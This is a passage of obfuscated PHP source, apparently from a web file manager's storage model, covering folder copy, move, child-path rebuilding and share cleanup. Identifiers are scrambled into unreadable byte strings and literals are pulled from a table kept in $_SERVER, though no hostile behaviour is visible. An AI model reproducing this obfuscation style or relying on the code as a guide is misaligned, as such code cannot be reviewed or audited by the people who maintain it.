$Ö¸È™²« = $this->fileNameAutoCache($‹Æ¼áşÈ, $Ö¸È™²«, $úÏ¬ô«¾, $â«úï‘Ú); $²î½¦¿Ë = $this->_copyCreate($Ó°Ìü‰³, $‹Æ¼áşÈ, $Ö¸È™²«, $ş–‚íŠÓ); } else { if ($úÏ¬ô«¾ == REPEAT_REPLACE) { $µğÚ‹±Î = $this->sourceInfoCache($ÃİëÖş); $Ôº—•¾õ = $this->fileHistory($µğÚ‹±Î, $³–ñËÖŒ[$‚ôüÏÀ[472]], $³–ñËÖŒ[$‚ôüÏÀ[90]]); if ($Ôº—•¾õ) { $ş–‚íŠÓ[$‚ôüÏÀ[568]][] = $³–ñËÖŒ[$‚ôüÏÀ[472]]; } } else { if ($úÏ¬ô«¾ == REPEAT_SKIP) { } } } Hook::trigger($‚ôüÏÀ[573], array($‚ôüÏÀ[574], $³–ñËÖŒ, 0)); } return $²î½¦¿Ë; } private function _copyCreate($ß»Àæ´, $âË÷°Á, $–Œïç°™, &$ñ¼ö°Íå) { $ˆ¨Ğı±É =& $_SERVER[¯µç›È¢]; $éå€šçÁ = $this->sourceInfoCache($ß»Àæ´); $´³¨ Ó = $this->sourceInfoCache($âË÷°Á); $´ÑÄ¯»ß = $this->_makeItemData($éå€šçÁ, $´³¨ Ó, $–Œïç°™); Hook::trigger($ˆ¨Ğı±É[575], $´ÑÄ¯»ß); Hook::trigger($ˆ¨Ğı±É[576], array($ˆ¨Ğı±É[577], $´ÑÄ¯»ß, 0)); $õ÷àÏµ = $this->add($´ÑÄ¯»ß); $‰şß­•£ = array($ˆ¨Ğı±É[408] => $õ÷àÏµ, $ˆ¨Ğı±É[32] => $–Œïç°™); $this->_copyApplyMeta($‰şß­•£, $ñ¼ö°Íå); if ($éå€šçÁ[$ˆ¨Ğı±É[416]] != $ˆ¨Ğı±É[99]) { $ñ¼ö°Íå[$ˆ¨Ğı±É[568]][] = $éå€šçÁ[$ˆ¨Ğı±É[472]]; return $õ÷àÏµ; } $Í”Üëò = array(); $„• öö = array(); $this->_childrenListAll($ß»Àæ´, $Í”Üëò); $Ï“Ä®í„ = count($Í”Üëò); if ($Ï“Ä®í„ == 0) { return $õ÷àÏµ; } $ûäÚïª = $this->sourceInfo($õ÷àÏµ); foreach ($Í”Üëò as $ÑÉüè×ı) { $¤”ß‡§Ì = $this->_makeItemData($ÑÉüè×ı, $ûäÚïª, $ÑÉüè×ı[$ˆ¨Ğı±É[32]]); $¤”ß‡§Ì[$ˆ¨Ğı±É[526]] = $ÑÉüè×ı[$ˆ¨Ğı±É[526]]; $„• öö[] = $¤”ß‡§Ì; } $this->chunkEventSet($ˆ¨Ğı±É[578], array($ˆ¨Ğı±É[579], $´ÑÄ¯»ß, $Ï“Ä®í„)); $this->addAll($„• öö, array(), !1); $‘—½°í¦ = $this->where(array($ˆ¨Ğı±É[503] => $õ÷àÏµ))->select(); $´êÅ › = $this->_childrenMakeRelation($Í”Üëò, $‘—½°í¦); $´êÅ ›[$ß»Àæ´] = $õ÷àÏµ; $¶³õï©÷ = array(); $‡ÑÌËäÅ = array(); foreach ($‘—½°í¦ as $ÑÉüè×ı) { $Âİ¢¹ó½ = $ÑÉüè×ı[$ˆ¨Ğı±É[408]]; $„È¹¨Ä‘ = $this->_childrenMatch($´êÅ ›, $ÑÉüè×ı, $ûäÚïª); $¶³õï©÷[] = array($ˆ¨Ğı±É[408], $Âİ¢¹ó½, $ˆ¨Ğı±É[503], $„È¹¨Ä‘[$ˆ¨Ğı±É[503]]); $‡ÑÌËäÅ[] = array($ˆ¨Ğı±É[408], $Âİ¢¹ó½, $ˆ¨Ğı±É[526], $„È¹¨Ä‘[$ˆ¨Ğı±É[526]]); $this->_copyApplyMeta($ÑÉüè×ı, $ñ¼ö°Íå); if ($ÑÉüè×ı[$ˆ¨Ğı±É[416]] != $ˆ¨Ğı±É[99]) { $ñ¼ö°Íå[$ˆ¨Ğı±É[568]][] = $ÑÉüè×ı[$ˆ¨Ğı±É[472]]; } } $this->chunkEventSet($ˆ¨Ğı±É[580], array($ˆ¨Ğı±É[581], $´ÑÄ¯»ß, $Ï“Ä®í„)); $this->saveAll($¶³õï©÷); $this->chunkEventSet($ˆ¨Ğı±É[582], array($ˆ¨Ğı±É[583], $´ÑÄ¯»ß, $Ï“Ä®í„)); $this->saveAll($‡ÑÌËäÅ); return $õ÷àÏµ; } private function _childrenMakeRelation($òØå‰æ¯, $Íêæ¶±Å) { $è÷Øá©ç =& $_SERVER[¯µç›È¢]; $Ëò­Î¶µ = array(); $ñ±¯ÌÆ = array(); foreach ($òØå‰æ¯ as $¶óšşì) { $õÌƒ‘ò = $¶óšşì[$è÷Øá©ç[32]] . $è÷Øá©ç[8] . $¶óšşì[$è÷Øá©ç[526]]; $Ëò­Î¶µ[$õÌƒ‘ò] = $¶óšşì[$è÷Øá©ç[408]]; } foreach ($Íêæ¶±Å as $¶óšşì) { $õÌƒ‘ò = $¶óšşì[$è÷Øá©ç[32]] . $è÷Øá©ç[8] . $¶óšşì[$è÷Øá©ç[526]]; $Ğ°Ñ±Ãä = $Ëò­Î¶µ[$õÌƒ‘ò]; $ñ±¯ÌÆ[$Ğ°Ñ±Ãä] = $¶óšşì[$è÷Øá©ç[408]]; } return $ñ±¯ÌÆ; } private function _childrenMatch($ìÜ¸Ó—, $Œ„·Î…, $£µ‚¢¥ç) { $¿¯ÎÁ— =& $_SERVER[¯µç›È¢]; $Ïˆõâàø = $£µ‚¢¥ç[$¿¯ÎÁ—[526]]; $°ëûğé = $this->parentLevelArray($Œ„·Î…[$¿¯ÎÁ—[526]]); foreach ($°ëûğé as $ƒÔÂÛÊ) { if (isset($ìÜ¸Ó—[$ƒÔÂÛÊ])) { $Ïˆõâàø .= $ìÜ¸Ó—[$ƒÔÂÛÊ] . $¿¯ÎÁ—[584]; } } $Ïˆõâàø = rtrim($Ïˆõâàø, $¿¯ÎÁ—[50]) . $¿¯ÎÁ—[50]; $Â¿ü¢º = $this->parentLevelArray($Ïˆõâàø); $£¤²™“ = $Â¿ü¢º[count($Â¿ü¢º) - 1]; return array($¿¯ÎÁ—[503] => $£¤²™“, $¿¯ÎÁ—[526] => $Ïˆõâàø); } private function _makeItemData($âáìé·Å, $ËÎ¥‡å, $ªíŸì”) { $£ŒÃ‚­Æ =& $_SERVER[¯µç›È¢]; $„Š’ìÕ€ = array($£ŒÃ‚­Æ[585] => $âáìé·Å[$£ŒÃ‚­Æ[416]], $£ŒÃ‚­Æ[426] => $ªíŸì”, $£ŒÃ‚­Æ[586] => $âáìé·Å[$£ŒÃ‚­Æ[418]] ? $âáìé·Å[$£ŒÃ‚­Æ[418]] : $£ŒÃ‚­Æ[12], $£ŒÃ‚­Æ[473] => $âáìé·Å[$£ŒÃ‚­Æ[472]] ? $âáìé·Å[$£ŒÃ‚­Æ[472]] : 0, $£ŒÃ‚­Æ[587] => $âáìé·Å[$£ŒÃ‚­Æ[90]] ? $âáìé·Å[$£ŒÃ‚­Æ[90]] : 0, $£ŒÃ‚­Æ[588] => intval($ËÎ¥‡å[$£ŒÃ‚­Æ[417]]), $£ŒÃ‚­Æ[589] => intval($ËÎ¥‡å[$£ŒÃ‚­Æ[510]]), $£ŒÃ‚­Æ[590] => intval(USER_ID), $£ŒÃ‚­Æ[591] => intval(USER_ID), $£ŒÃ‚­Æ[407] => intval($ËÎ¥‡å[$£ŒÃ‚­Æ[408]]), $£ŒÃ‚­Æ[592] => $ËÎ¥‡å[$£ŒÃ‚­Æ[526]] . $ËÎ¥‡å[$£ŒÃ‚­Æ[408]] . $£ŒÃ‚­Æ[50], $£ŒÃ‚­Æ[430] => $âáìé·Å[$£ŒÃ‚­Æ[96]] ? $âáìé·Å[$£ŒÃ‚­Æ[96]] : time(), $£ŒÃ‚­Æ[435] => 0, $£ŒÃ‚­Æ[593] => $£ŒÃ‚­Æ[12]); return $„Š’ìÕ€; } private function _copyApplyMeta($»ëÁüÖş, &$®¿Ğò¨) { $îÈˆò®“ =& $_SERVER[¯µç›È¢]; $ïñ‚×Ş” = $»ëÁüÖş[$îÈˆò®“[408]]; $ŒãÆë“ = $»ëÁüÖş[$îÈˆò®“[32]]; if (!isset($»ëÁüÖş[$îÈˆò®“[594]]) || !$»ëÁüÖş[$îÈˆò®“[594]] || $»ëÁüÖş[$îÈˆò®“[594]] == $îÈˆò®“[204]) { $®¿Ğò¨[$îÈˆò®“[570]][] = array($îÈˆò®“[408], $ïñ‚×Ş”, $îÈˆò®“[594], short_id($ïñ‚×Ş”)); } if (Input::check($ŒãÆë“, $îÈˆò®“[595])) { $®¿Ğò¨[$îÈˆò®“[569]][] = array($îÈˆò®“[408] => $ïñ‚×Ş”, $îÈˆò®“[105] => $îÈˆò®“[469], $îÈˆò®“[382] => str_replace($îÈˆò®“[53], $îÈˆò®“[12], Pinyin::get($ŒãÆë“))); $®¿Ğò¨[$îÈˆò®“[569]][] = array($îÈˆò®“[408] => $ïñ‚×Ş”, $îÈˆò®“[105] => $îÈˆò®“[468], $îÈˆò®“[382] => Pinyin::get($ŒãÆë“, $îÈˆò®“[596])); } $®¿Ğò¨[$îÈˆò®“[569]][] = array($îÈˆò®“[408] => $ïñ‚×Ş”, $îÈˆò®“[105] => $îÈˆò®“[447], $îÈˆò®“[382] => KodSort::makeStr($ŒãÆë“)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($”‚ØëóÇ) { $» ç·±‹ =& $_SERVER[¯µç›È¢]; $å½ıüÏŒ = $this->sourceInfo($”‚ØëóÇ); $Ğ¦‡™© = $» ç·±‹[597]; $÷ä±…„¨ = array($» ç·±‹[526] => array($» ç·±‹[552], $å½ıüÏŒ[$» ç·±‹[526]] . $”‚ØëóÇ . $» ç·±‹[553]), $» ç·±‹[436] => $this->targetIsDelete); $æØ»Û‹Î = $this->field($Ğ¦‡™©)->where($÷ä±…„¨)->select(); if (!$æØ»Û‹Î) { return; } $æØ»Û‹Î = array_to_keyvalue($æØ»Û‹Î, $» ç·±‹[408]); foreach ($æØ»Û‹Î as $üà³Ì‚à) { $¹ë¸¬Ò™ = $üà³Ì‚à[$» ç·±‹[503]]; $”‚ØëóÇ = $üà³Ì‚à[$» ç·±‹[408]]; if (!isset($this->_childrenListCache[$”‚ØëóÇ]) && $üà³Ì‚à[$» ç·±‹[416]] == $» ç·±‹[99]) { $this->_childrenListCache[$”‚ØëóÇ] = array(); } if (!isset($this->_childrenListCache[$¹ë¸¬Ò™])) { $this->_childrenListCache[$¹ë¸¬Ò™] = array(); } $this->_childrenListCache[$¹ë¸¬Ò™][$”‚ØëóÇ] = $üà³Ì‚à; $this->_childrenItemCache[$”‚ØëóÇ] = $üà³Ì‚à; } } private function _childrenListAll($†Ôñ‚ƒ”, &$ŸÊ¿¸ÖØ) { $§¢‰Ì…… =& $_SERVER[¯µç›È¢]; if (!isset($this->_childrenListCache[$†Ôñ‚ƒ”])) { return; } $ŞâÌ‹ıÁ = $this->_childrenListCache[$†Ôñ‚ƒ”]; foreach ($ŞâÌ‹ıÁ as $á†ù³“¡ => $è¤Ò¸Ğè) { $ŸÊ¿¸ÖØ[$á†ù³“¡] = $è¤Ò¸Ğè; if ($è¤Ò¸Ğè[$§¢‰Ì……[416]] == $§¢‰Ì……[99]) { $this->_childrenListAll($á†ù³“¡, $ŸÊ¿¸ÖØ); } } } private function sourceInfoCache($èÈ±§”‹) { if (isset($this->_childrenItemCache[$èÈ±§”‹])) { return $this->_childrenItemCache[$èÈ±§”‹]; } return $this->sourceInfo($èÈ±§”‹); } private function _childrenList($‚³æÀí¹) { if (isset($this->_childrenListCache[$‚³æÀí¹])) { return $this->_childrenListCache[$‚³æÀí¹]; } return $this->_childrenListSelect($‚³æÀí¹); } private function _childrenListSelect($‚á¼£¾ç) { $Ü·Ëî¤¤ =& $_SERVER[¯µç›È¢]; $Úø±óÔä = array($Ü·Ëî¤¤[503] => $‚á¼£¾ç, $Ü·Ëî¤¤[436] => $this->targetIsDelete); $ôÚÂá¾ = $this->where($Úø±óÔä)->select(); $ôÚÂá¾ = $ôÚÂá¾ ? $ôÚÂá¾ : array(); $¬éªñ÷˜ = array_to_keyvalue($ôÚÂá¾, $Ü·Ëî¤¤[408]); $this->_childrenListCache[$‚á¼£¾ç] = $¬éªñ÷˜; foreach ($¬éªñ÷˜ as $‚á¼£¾ç => $îŠ³²ğ) { $this->_childrenItemCache[$‚á¼£¾ç] = $îŠ³²ğ; } return $¬éªñ÷˜; } private function fileNameExistCache($ªÔ€ñÙ, $¸£–˜ù–) { $¸€³À“¸ =& $_SERVER[¯µç›È¢]; $¸£–˜ù– = strtolower($¸£–˜ù–); $ÒÑ¯ú–ö = $this->_childrenList($ªÔ€ñÙ); foreach ($ÒÑ¯ú–ö as $ËîĞÄ„) { if ($¸£–˜ù– == strtolower($ËîĞÄ„[$¸€³À“¸[32]])) { return $ËîĞÄ„[$¸€³À“¸[408]]; } } return !1; } private function fileNameAutoCache($ãÈ€šó¢, $Äàóäü‡, $´³‘›¶É, $êøÍÌ²») { $ùÆ¼˜Ã =& $_SERVER[¯µç›È¢]; $›½µİÈÎ = $this->_childrenList($ãÈ€šó¢); $ÙÒÕôÜ‡ = array_to_keyvalue($›½µİÈÎ, $ùÆ¼˜Ã[12], $ùÆ¼˜Ã[32]); return $this->fileNameAutoGet($ÙÒÕôÜ‡, $Äàóäü‡, $´³‘›¶É, $êøÍÌ²»); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ÛŒÇÒ¢¢, $„Â÷¸Ï®, $åù¼ƒã = REPEAT_REPLACE, $º£›ŸÄ = '') { $¢°òçƒŒ =& $_SERVER[¯µç›È¢]; $ğÈ†“Ï = $this->sourceInfo($ÛŒÇÒ¢¢); $£í“Õœ„ = $this->sourceInfo($„Â÷¸Ï®); if ($ğÈ†“Ï[$¢°òçƒŒ[503]] == $£í“Õœ„[$¢°òçƒŒ[408]]) { if ($ğÈ†“Ï[$¢°òçƒŒ[436]] == $¢°òçƒŒ[99]) { Model($¢°òçƒŒ[434])->restore(array($ÛŒÇÒ¢¢)); } if (!$º£›ŸÄ || $º£›ŸÄ == $ğÈ†“Ï[$¢°òçƒŒ[32]]) { return $ÛŒÇÒ¢¢; } } $Ñ©¬†…Ó = $this->pathInfoMore($ÛŒÇÒ¢¢); if ($this->isParentOf($ÛŒÇÒ¢¢, $„Â÷¸Ï®)) { return !1; } if (!$ğÈ†“Ï || !$£í“Õœ„ || $£í“Õœ„[$¢°òçƒŒ[416]] != $¢°òçƒŒ[99]) { return !1; } Hook::trigger($¢°òçƒŒ[598], $Ñ©¬†…Ó); $this->targetIsDelete = intval($ğÈ†“Ï[$¢°òçƒŒ[436]]); if ($ğÈ†“Ï[$¢°òçƒŒ[503]] == $„Â÷¸Ï® && $º£›ŸÄ != $ğÈ†“Ï[$¢°òçƒŒ[32]]) { $“ğªœÓÛ = $this->fileNameExist($„Â÷¸Ï®, $º£›ŸÄ); if ($“ğªœÓÛ && $ğÈ†“Ï[$¢°òçƒŒ[416]] == $¢°òçƒŒ[204]) { $†Ìœü­£ = $this->sourceInfo($“ğªœÓÛ); $ÅÑšõï = $this->fileHistory($†Ìœü­£, $ğÈ†“Ï[$¢°òçƒŒ[472]], $ğÈ†“Ï[$¢°òçƒŒ[90]]); if (!$ÅÑšõï) { Model($¢°òçƒŒ[475])->remove($ğÈ†“Ï[$¢°òçƒŒ[472]]); } $this->removeNow($ÛŒÇÒ¢¢, !1); $this->folderSizeReset($„Â÷¸Ï®); Hook::trigger($¢°òçƒŒ[599], $Ñ©¬†…Ó); return $“ğªœÓÛ; } } $Á¼´Ùü = $º£›ŸÄ ? $º£›ŸÄ : $ğÈ†“Ï[$¢°òçƒŒ[32]]; $this->lockMoveStart($ÛŒÇÒ¢¢); $this->lockWriteStart($„Â÷¸Ï®, $Á¼´Ùü); $˜ÆÑÏ…ˆ = array($¢°òçƒŒ[568] => array(), $¢°òçƒŒ[600] => !1); $this->clearShare($ÛŒÇÒ¢¢, $„Â÷¸Ï®); $œÉÇ¸Æõ = $this->fileNameExistCache($„Â÷¸Ï®, $ğÈ†“Ï[$¢°òçƒŒ[32]]); $Ò÷ÇõäÊ = $this->_move($ÛŒÇÒ¢¢, $„Â÷¸Ï®, $åù¼ƒã, $˜ÆÑÏ…ˆ, $º£›ŸÄ); $this->sourceCacheClear(); if ($ğÈ†“Ï[$¢°òçƒŒ[416]] == $¢°òçƒŒ[99] && $œÉÇ¸Æõ) { $this->folderSizeResetChildren($Ò÷ÇõäÊ); } Model($¢°òçƒŒ[206])->linkAdd($˜ÆÑÏ…ˆ[$¢°òçƒŒ[568]]); if ($œÉÇ¸Æõ && $˜ÆÑÏ…ˆ[$¢°òçƒŒ[600]]) { $this->removeNow($ÛŒÇÒ¢¢, !1); } $this->lockMoveEnd($ÛŒÇÒ¢¢); $this->lockWriteEnd($„Â÷¸Ï®, $Á¼´Ùü); $this->folderSizeReset($ğÈ†“Ï[$¢°òçƒŒ[503]]); $this->folderSizeReset($„Â÷¸Ï®); $ò±Á”Ş = array($ğÈ†“Ï[$¢°òçƒŒ[503]], $„Â÷¸Ï®); if ($ğÈ†“Ï[$¢°òçƒŒ[416]] == $¢°òçƒŒ[99]) { $ò±Á”Ş[] = $ÛŒÇÒ¢¢; } $this->updateModifyTime($ò±Á”Ş); Model($¢°òçƒŒ[572])->eventMove($ÛŒÇÒ¢¢, $ğÈ†“Ï[$¢°òçƒŒ[503]], $„Â÷¸Ï®); Hook::trigger($¢°òçƒŒ[599], $Ñ©¬†…Ó); return $Ò÷ÇõäÊ; } private function _move($ûÁÜõ…º, $ÈÌÕ„‰û, $°’µÒ“ï, &$ö‡–öâ¢, $ĞÂ«ü¸º = '') { $É×ğ†ß =& $_SERVER[¯µç›È¢]; $‹»Œš‘ = $this->sourceInfo($ûÁÜõ…º); $šúâòîÄ = $‹»Œš‘[$É×ğ†ß[416]] == $É×ğ†ß[99]; $Ûó–úË´ = $ĞÂ«ü¸º ? $ĞÂ«ü¸º : $‹»Œš‘[$É×ğ†ß[32]]; $€´†‹İª = $this->fileNameExistCache($ÈÌÕ„‰û, $Ûó–úË´); $this->lockMoveStart($ûÁÜõ…º); $this->lockWriteStart($ÈÌÕ„‰û, $Ûó–úË´); if (!$€´†‹İª) { return $this->_moveForce($ûÁÜõ…º, $ÈÌÕ„‰û, $Ûó–úË´); } $­Ğ•ÜŒµ = $€´†‹İª; $Ö‡›Ù¨ = !1; if ($šúâòîÄ) { if ($°’µÒ“ï == REPEAT_RENAME_FOLDER) { $Ûó–úË´ = $this->fileNameAuto($ÈÌÕ„‰û, $Ûó–úË´, $°’µÒ“ï, $šúâòîÄ); $­Ğ•ÜŒµ = $this->_moveForce($ûÁÜõ…º, $ÈÌÕ„‰û, $Ûó–úË´); } else { if ($°’µÒ“ï == REPEAT_RENAME_FOLDER) { $°’µÒ“ï = REPEAT_RENAME; } $¶å›ñùö = $this->_childrenListSelect($ûÁÜõ…º); foreach ($¶å›ñùö as $°Ã×²‹Ÿ) { $this->_move($°Ã×²‹Ÿ[$É×ğ†ß[408]], $€´†‹İª, $°’µÒ“ï, $ö‡–öâ¢); } $Ö‡›Ù¨ = !0; } } else { if ($°’µÒ“ï == REPEAT_SKIP) { $Ö‡›Ù¨ = !0; } else { if ($°’µÒ“ï == REPEAT_RENAME || $°’µÒ“ï == REPEAT_RENAME_FOLDER) { $Ûó–úË´ = $this->fileNameAuto($ÈÌÕ„‰û, $Ûó–úË´, $°’µÒ“ï, $šúâòîÄ); $­Ğ•ÜŒµ = $this->_moveForce($ûÁÜõ…º, $ÈÌÕ„‰û, $Ûó–úË´); } else { if ($°’µÒ“ï == REPEAT_REPLACE) { $ç°æÒ…Ö = $this->sourceInfoCache($€´†‹İª); $Áù©ûµ” = $this->fileHistory($ç°æÒ…Ö, $‹»Œš‘[$É×ğ†ß[472]], $‹»Œš‘[$É×ğ†ß[90]]); $Ö‡›Ù¨ = !0; if ($Áù©ûµ”) { $ö‡–öâ¢[$É×ğ†ß[568]][] = $‹»Œš‘[$É×ğ†ß[472]]; } } } } } if ($Ö‡›Ù¨ && !$ö‡–öâ¢[$É×ğ†ß[600]]) { $ö‡–öâ¢[$É×ğ†ß[600]] = !0; } return $­Ğ•ÜŒµ; } private function _moveForce($Çªàƒ¡–, $ÌŸ‘°€›, $Â¥ö¬¯Ş) { $ÔÖĞ¸³Ê =& $_SERVER[¯µç›È¢]; $Ö³æ€÷´ = $this->sourceInfo($Çªàƒ¡–); $¼üÙüğ = $this->sourceInfo($ÌŸ‘°€›); $ÚÑ—õÜŠ = $Ö³æ€÷´[$ÔÖĞ¸³Ê[416]] == $ÔÖĞ¸³Ê[99]; $‰ãˆĞ›‘ = array($ÔÖĞ¸³Ê[407] => $¼üÙüğ[$ÔÖĞ¸³Ê[408]], $ÔÖĞ¸³Ê[592] => $¼üÙüğ[$ÔÖĞ¸³Ê[526]] . $¼üÙüğ[$ÔÖĞ¸³Ê[408]] . $ÔÖĞ¸³Ê[50], $ÔÖĞ¸³Ê[588] => $¼üÙüğ[$ÔÖĞ¸³Ê[417]], $ÔÖĞ¸³Ê[589] => $¼üÙüğ[$ÔÖĞ¸³Ê[510]], $ÔÖĞ¸³Ê[591] => USER_ID, $ÔÖĞ¸³Ê[426] => $Â¥ö¬¯Ş); $íÇé°èí = $Ö³æ€÷´[$ÔÖĞ¸³Ê[417]] == SourceModel::TYPE_GROUP && $¼üÙüğ[$ÔÖĞ¸³Ê[417]] == SourceModel::TYPE_GROUP && $Ö³æ€÷´[$ÔÖĞ¸³Ê[510]] == $¼üÙüğ[$ÔÖĞ¸³Ê[510]]; if (!$íÇé°èí && $this->moveClearAuth) { Model($ÔÖĞ¸³Ê[507])->authClear($Çªàƒ¡–); } $„ÅŸ¿óÄ = $Ö³æ€÷´[$ÔÖĞ¸³Ê[436]] == $ÔÖĞ¸³Ê[99] && $¼üÙüğ[$ÔÖĞ¸³Ê[436]] != $ÔÖĞ¸³Ê[99]; if ($„ÅŸ¿óÄ) { $‰ãˆĞ›‘[$ÔÖĞ¸³Ê[435]] = 0; } if ($ÚÑ—õÜŠ) { $Á¿´ş°º = array($ÔÖĞ¸³Ê[592] => array($ÔÖĞ¸³Ê[552], $Ö³æ€÷´[$ÔÖĞ¸³Ê[526]] . $Ö³æ€÷´[$ÔÖĞ¸³Ê[408]] . $ÔÖĞ¸³Ê[553])); $ñö¹¿ëı = $Ö³æ€÷´[$ÔÖĞ¸³Ê[526]] . $Ö³æ€÷´[$ÔÖĞ¸³Ê[408]] . $ÔÖĞ¸³Ê[50]; $î¶ñ†Êá = $¼üÙüğ[$ÔÖĞ¸³Ê[526]] . $¼üÙüğ[$ÔÖĞ¸³Ê[408]] . $ÔÖĞ¸³Ê[50] . $Ö³æ€÷´[$ÔÖĞ¸³Ê[408]] . $ÔÖĞ¸³Ê[50]; $îó±…åà = array($ÔÖĞ¸³Ê[592] => array($ÔÖĞ¸³Ê[601], "\x72\145\160\x6c\141\x63\x65\50\160\x61\162\145\156\164\x4c\145\x76\145\154\54\x27{$ñö¹¿ëı}\x27\54\x27{$î¶ñ†Êá}\47\x29"), $ÔÖĞ¸³Ê[588] => $¼üÙüğ[$ÔÖĞ¸³Ê[417]], $ÔÖĞ¸³Ê[589] => $¼üÙüğ[$ÔÖĞ¸³Ê[510]]); if ($„ÅŸ¿óÄ) { $îó±…åà[$ÔÖĞ¸³Ê[435]] = 0; } $this->where($Á¿´ş°º)->data($îó±…åà)->save(); } $this->where(array($ÔÖĞ¸³Ê[423] => $Çªàƒ¡–))->data($‰ãˆĞ›‘)->save(); return $Çªàƒ¡–; } private function clearShare($ñÜëÆ¬, $àüÓ‚Ş) { $Ò“¤ÏÕü =& $_SERVER[¯µç›È¢]; $Å†š«Í´ = $this->sourceInfo($ñÜëÆ¬); $çİá½û¹ = $this->sourceInfo($àüÓ‚Ş); if ($Å†š«Í´[$Ò“¤ÏÕü[510]] == $çİá½û¹[$Ò“¤ÏÕü[510]] && $Å†š«Í´[$Ò“¤ÏÕü[417]] == $Ò“¤ÏÕü[602]) { return; } $ äóÓ†« = array($Ò“¤ÏÕü[526] => array($Ò“¤ÏÕü[552], $Å†š«Í´[$Ò“¤ÏÕü[526]] . $ñÜëÆ¬ . $Ò“¤ÏÕü[553])); $û“İÔ»ó = $this->field($Ò“¤ÏÕü[423])->where($ äóÓ†«)->getField($Ò“¤ÏÕü[408], !0); if (!$û“İÔ»ó) { return; } $ äóÓ†« = array($Ò“¤ÏÕü[408] => array($Ò“¤ÏÕü[7], $û“İÔ»ó), $Ò“¤ÏÕü[500] => 1); $®öˆ¸€ = Model($Ò“¤ÏÕü[603])->field($Ò“¤ÏÕü[493])->where($ äóÓ†«)->select(); if (!$®öˆ¸€) { return; } $®öˆ¸€ = array_to_keyvalue($®öˆ¸€, $Ò“¤ÏÕü[12], $Ò“¤ÏÕü[493]); $ äóÓ†« = array($Ò“¤ÏÕü[493] => array($Ò“¤ÏÕü[7], $®öˆ¸€)); Model($Ò“¤ÏÕü[603])->where($ äóÓ†«)->save(array($Ò“¤ÏÕü[500] => 0)); Model($Ò“¤ÏÕü[604])->where($ äóÓ†«)->delete(); } public function copyFolderFromIO($ÚŸó½¬÷, $œ÷óŞÖâ, $ƒìíİÖÔ, $´½¢À®•, $²€ş‘ˆ, $Èº¥¿õ‰ = false) { $ó®¿£ş¡ =& $_SERVER[¯µç›È¢]; $¤Ü»¾»º = array($ó®¿£ş¡[569] => array(), $ó®¿£ş¡[570] => array(), $ó®¿£ş¡[568] => array(), $ó®¿£ş¡[605] => array()); $ù„—Ãñ­ = $Èº¥¿õ‰ ? $Èº¥¿õ‰ : $ÚŸó½¬÷->pathThis($œ÷óŞÖâ); $¹É×À‘» = $this->fileNameExist($ƒìíİÖÔ, $ù„—Ãñ­); $ÅÓ×å…™ = $this->mkdir($ƒìíİÖÔ, $ù„—Ãñ­, $´½¢À®•); if (!$¹É×À‘» || $´½¢À®• == REPEAT_RENAME_FOLDER) { $´½¢À®• = !1; } if ($¹É×À‘») { $this->_childrenAllMake($¹É×À‘»); } Hook::trigger($ó®¿£ş¡[606]); $this->_copyChildTo($ÚŸó½¬÷, $œ÷óŞÖâ, $ÅÓ×å…™, $´½¢À®•, $¤Ü»¾»º, $²€ş‘ˆ); Hook::trigger($ó®¿£ş¡[607]); if ($ÅÓ×å…™) { $this->folderSizeResetChildren($ÅÓ×å…™); } $this->_childrenListClear(); Model($ó®¿£ş¡[571])->addAll($¤Ü»¾»º[$ó®¿£ş¡[569]], array(), !0); Model($ó®¿£ş¡[572])->eventCopy($ÅÓ×å…™); $this->saveAll($¤Ü»¾»º[$ó®¿£ş¡[570]]); Model($ó®¿£ş¡[475])->linkAdd($¤Ü»¾»º[$ó®¿£ş¡[568]]); Model($ó®¿£ş¡[475])->remove($¤Ü»¾»º[$ó®¿£ş¡[605]]); $this->folderSizeReset($ƒìíİÖÔ); $this->updateModifyTime($ƒìíİÖÔ); return $ÅÓ×å…™; } private function _copyChildTo($œû˜¯½ä, $•–ìÓÊÆ, $ÒŞèòÒÎ, $ï¾Òú‹‰, &$ïôø¹ÅÊ, $…úåÏè°) { $ÀÃ¾Ò¤ =& $_SERVER[¯µç›È¢]; $¨ôñÅ°º = $this->sourceInfoCache($ÒŞèòÒÎ); $ª“àÀ”² = $œû˜¯½ä->listPath($•–ìÓÊÆ); $ª“àÀ”² = $ª“àÀ”² ? $ª“àÀ”² : array($ÀÃ¾Ò¤[86] => array(), $ÀÃ¾Ò¤[87] => array()); $Æû™â“Ş = array_merge($ª“àÀ”²[$ÀÃ¾Ò¤[86]], $ª“àÀ”²[$ÀÃ¾Ò¤[87]]); $ŸÁ¦ıÔ  = $this->_addFiles($œû˜¯½ä, $ª“àÀ”²[$ÀÃ¾Ò¤[86]], $…úåÏè°); $Óş‚ÓĞâ = array(); foreach ($Æû™â“Ş as &$Á¨©‹ÜÖ) { if (isset($ŸÁ¦ıÔ [$Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]]])) { $Á¨©‹ÜÖ = $ŸÁ¦ıÔ [$Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]]]; } $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[416]] = $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[33]] == $ÀÃ¾Ò¤[89]; $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[418]] = _get($Á¨©‹ÜÖ, $ÀÃ¾Ò¤[181], $ÀÃ¾Ò¤[12]); $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[90]] = _get($Á¨©‹ÜÖ, $ÀÃ¾Ò¤[90], 0); $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]] = _get($Á¨©‹ÜÖ, $ÀÃ¾Ò¤[472], 0); if (!isset($Á¨©‹ÜÖ[$ÀÃ¾Ò¤[608]]) && $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]]) { $ïôø¹ÅÊ[$ÀÃ¾Ò¤[605]][] = $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[472]]; } if ($ï¾Òú‹‰) { $áã»­Î = $this->fileNameExistCache($ÒŞèòÒÎ, $Á¨©‹ÜÖ[$ÀÃ¾Ò¤[32]]); if ($áã»­Î) { if ($Á¨©‹ÜÖ[$ÀÃ¾Ò¤[416]] || $ï¾Òú‹‰ == REPEAT_SKIP) { continue; } if ($ï¾Òú‹‰ == REPEAT_REPLACE) { $”Ğ¶Ö„ = $this->sourceInfoCache($áã»­Î); $ÂûÆÅòÃ = 